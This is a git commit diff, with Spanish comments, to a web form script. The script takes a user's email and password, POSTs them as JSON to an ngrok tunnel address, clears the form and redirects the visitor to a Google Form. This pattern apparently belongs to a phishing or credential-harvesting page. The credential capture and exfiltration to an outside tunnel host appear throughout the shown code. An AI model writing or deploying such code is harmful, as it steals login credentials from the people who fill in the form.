6e87fc115e05c92d7fa638dd2fb14eb8a33c759b
Strike-Falcon <paolo.macazana15@gmail.com>
2024-08-06 21:33:08 -0500

    Update script.js

--- script.js
+++ script.js
@@ -8,16 +8,17 @@ formElement.addEventListener("submit", (event) => {
     let transaction = { email: email, password: password };
     let transactionJson = JSON.stringify(transaction);
 
-    fetch("https://6182-45-230-198-19.ngrok-free.app/prueba", {
+   fetch("https://6182-45-230-198-19.ngrok-free.app/prueba", {
         method: "POST",
         headers: {
-            "Content-Type": "application/json" 
+            "Content-Type": "application/json" // Asegúrate de establecer el tipo de contenido
         },
         body: transactionJson
     })
-      // Limpiar el formulario
-    document.getElementById('registroForm').reset();
-    
-    // Redirigir a un formulario de Google
-    window.location.href = "https://docs.google.com/forms/d/1aQvnqWGLfWUFuCgYajcQ13Fr9qAX-BSBsU8W4s8lU7E/edit";
-});
+    .then(response => {
+        console.log();
+    })
+        // Limpiar el formulario y redirigir al formulario de Google
+        document.getElementById('registroForm').reset();
+        window.location.href = "https://docs.google.com/forms/d/1aQvnqWGLfWUFuCgYajcQ13Fr9qAX-BSBsU8W4s8lU7E/edit";
+    });
